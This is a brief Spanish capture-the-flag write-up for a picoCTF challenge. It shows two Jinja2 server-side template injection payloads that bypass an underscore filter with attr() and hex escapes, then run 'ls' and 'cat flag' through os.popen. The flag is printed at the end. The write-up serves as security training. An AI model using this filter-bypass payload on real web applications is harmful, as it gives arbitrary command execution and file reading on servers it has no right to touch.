

# reto
# Descripción
Why search for the flag when I can make a bookmarklet to print it for me?Browse here, and find the flag!

# Solución 
## solución
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

picoCTF{sst1_f1lt3r_byp4ss_e39c23ee} 2



Intente meterme con los comando del reto anterior y no me dejo, ahora la pagina filtras palabras clave como los __ asi que utilizamos el filtro attr() junto al guion bajo en hexadecimal \x5f para entrar al directorio, al visualizar el directorio hice cat del archivo flag y me dio la bandera.
# referencias
